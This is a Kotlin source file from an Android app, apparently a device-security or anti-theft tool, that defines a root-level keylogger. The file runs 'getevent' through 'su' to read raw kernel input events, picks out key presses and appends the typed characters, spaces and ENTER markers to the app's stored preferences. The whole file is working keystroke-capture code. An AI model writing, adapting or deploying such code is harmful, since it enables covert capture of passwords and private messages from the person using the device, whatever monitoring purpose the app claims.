package com.hamoon.uncleted.util

import android.content.Context
import android.util.Log
import com.hamoon.uncleted.data.SecurityPreferences
import kotlinx.coroutines.*
import java.io.File
import java.io.InputStreamReader

object Keylogger {
    private const val TAG = "Keylogger"
    private var keyloggerJob: Job? = null
    private var keyloggerProcess: Process? = null

    fun start(context: Context) {
        if (keyloggerJob?.isActive == true) {
            Log.d(TAG, "Keylogger is already running.")
            return
        }

        keyloggerJob = CoroutineScope(Dispatchers.IO).launch {
            Log.w(TAG, "ROOT ACTION: Starting kernel-level keylogger.")
            EventLogger.log(context, "ROOT: Keylogger service started.")
            try {
                keyloggerProcess = ProcessBuilder("su", "-c", "getevent -l").start()
                val reader = InputStreamReader(keyloggerProcess!!.inputStream)
                reader.use {
                    it.forEachLine { line ->
                        if (isActive) {
                            parseAndStore(context, line)
                        } else {
                            return@forEachLine
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Keylogger failed to start or run.", e)
                EventLogger.log(context, "ROOT: ERROR - Keylogger failed: ${e.message}")
            } finally {
                stop()
            }
        }
    }

    fun stop() {
        if (keyloggerJob?.isActive == true) {
            keyloggerJob?.cancel()
        }
        keyloggerProcess?.destroy()
        keyloggerProcess = null
        keyloggerJob = null
        Log.i(TAG, "Keylogger stopped.")
    }

    private fun parseAndStore(context: Context, rawLine: String) {
        // This is a very basic parser. A real keylogger would need to handle
        // different device event formats, map scan codes to characters, and handle complex inputs.
        if (rawLine.contains("KEY_") && rawLine.contains("DOWN")) {
            val key = rawLine.substringAfter("KEY_").substringBefore(" ").trim()
            if (key.length == 1) { // Only log single characters for simplicity
                SecurityPreferences.appendKeylogData(context, key)
            } else if (key == "SPACE") {
                SecurityPreferences.appendKeylogData(context, " ")
            } else if (key == "ENTER") {
                SecurityPreferences.appendKeylogData(context, "[ENTER]\n")
            }
        }
    }
}